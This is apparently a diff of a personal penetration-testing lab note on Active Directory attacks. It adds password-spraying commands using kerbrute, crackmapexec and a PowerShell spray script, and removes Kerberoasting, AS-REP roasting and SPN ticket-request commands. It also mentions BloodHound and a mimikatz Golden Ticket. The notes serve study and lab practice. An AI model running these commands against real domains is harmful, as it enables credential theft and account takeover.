@@ -6,7 +6,15 @@ await tp.file.rename(filename);
 tR += "Part of " + "[" + "[" + "0_Lab_" + path[path.length - 2] + "]]";
 -%>
 
-
+# Password spraying
+Check for AD account lockout policy
+```powershell
+net accounts
+```
+If not set, we can try to spray AD passwords by two means:
+- `.\Spray-Passwords.ps1 -Pass Nexus123! -Admin` (see `~/Documents/activeInformationGathering`)
+- `kerbrute passwordspray -d corp.com .\usernames.txt "Password"` (cross-platform but requires UDP. Text file must be ANSI, else network error)
+- `crackmapexec smb $hip -u $user -p '$password' -d corp.com --continue-on-success`
 # BloodHound
 1. **Setup C2 (Kali)**
 ```bash
@@ -47,28 +55,7 @@ When done, transfer the .zip to kali ([[2_fileTransfer]])
 
 # Yet-to-test attacks
 
-##### Kerberoast
-```powershell
-impacket-GetUserSPNs -request -outputfile kerbi.txt -target-domain $domain -dc-ip $hip domain/username:password
-```
-##### ASREPRoasting
-Find users that don't require preauth
-1. Bruteforce user names or
-   ```powershell
-   Get-DomainUser -PreauthNotRequired -Verbose | ft
-   ```
-   (PowerView_dev.ps1)
-2. 
-   ```bash
-   python3 ~/tools/impacket/build/scripts-3.11/GetNPUsers.py -dc-host $hip -no-pass -usersfile users.txt $dnsserver -o asrep.hashes
-   ```
-3.  Use hashcat with -m 18200
 
-##### Request SPN Tickets
-```powershell
-Get-DomainUser -Identity $user | Get-DomainSPNTicket | select -ExpandProperty Hash
-```
-(PowerView.ps1)
 
 ##### Golden Ticket with mimikatz
 Enter mimikatz
